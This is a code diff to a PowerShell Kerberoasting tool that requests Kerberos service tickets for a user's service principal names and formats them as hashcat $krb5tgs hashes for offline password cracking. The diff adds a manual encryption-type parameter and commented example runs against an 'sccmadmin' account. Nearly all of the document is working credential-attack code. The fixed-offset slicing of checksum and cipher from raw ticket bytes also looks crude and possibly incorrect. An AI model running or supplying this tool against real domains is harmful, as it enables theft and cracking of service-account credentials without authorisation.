@@ -112,7 +112,10 @@ public class K {
 function Get-KerberosTicketHashcatFormat {
     param(
         [Parameter(Mandatory)]
-        [string]$SamAccountName
+        [string]$SamAccountName,
+
+        [Parameter(Mandatory)]
+        [string]$Etype  # <-- you provide this manually: 23 / 17 / 18
     )
 
     $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
@@ -127,39 +130,34 @@ function Get-KerberosTicketHashcatFormat {
         try {
             $ticketBytes = [K]::GetTicket($spn)
             if (-not $ticketBytes) {
-                Write-Warning "Failed to get ticket."
+                Write-Warning "Failed to get ticket for ${spn}"
                 continue
             }
 
             $ticketHex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
-            $etype = ""
-
-            # Quick hack to detect encryption type from raw hex
-            if ($ticketHex -match "020117") {
-                $etype = "23"
-            } elseif ($ticketHex -match "020111") {
-                $etype = "17"
-            } elseif ($ticketHex -match "020112") {
-                $etype = "18"
-            } else {
-                Write-Warning "[!] Could not determine encryption type for ${spn}"
-                continue
-            }
-
-            # Extract checksum and cipher manually (rough fallback method)
             $checksumHex = $ticketHex.Substring(0, 32)
             $cipherHex = $ticketHex.Substring(32)
 
-            # Format hashcat line
-            $userPart = $SamAccountName
-            $realm = "$env:USERDNSDOMAIN"
+            $realm = $env:USERDNSDOMAIN
             $spnSanitized = $spn.Replace(":", "~")
 
-            $hashcat = "$krb5tgs$${etype}*${userPart}$$${realm}$$${spnSanitized}*${checksumHex}$$${cipherHex}"
-            Write-Host "[+] Hashcat Format:`n${hashcat}`n"
+            $hashcat = "`$krb5tgs`$${Etype}*${SamAccountName}\$${realm}\$${spnSanitized}*${checksumHex}\$${cipherHex}"
+
+            Write-Host "`n[+] Hashcat Format:`n${hashcat}`n"
         }
         catch {
             Write-Warning "Error while processing SPN ${spn}: $_"
         }
     }
 }
+
+
+
+# For RC4-HMAC
+#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 23
+
+# For AES128
+#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 17
+
+# For AES256
+#Get-KerberosTicketHashcatFormat -SamAccountName "sccmadmin" -Etype 18
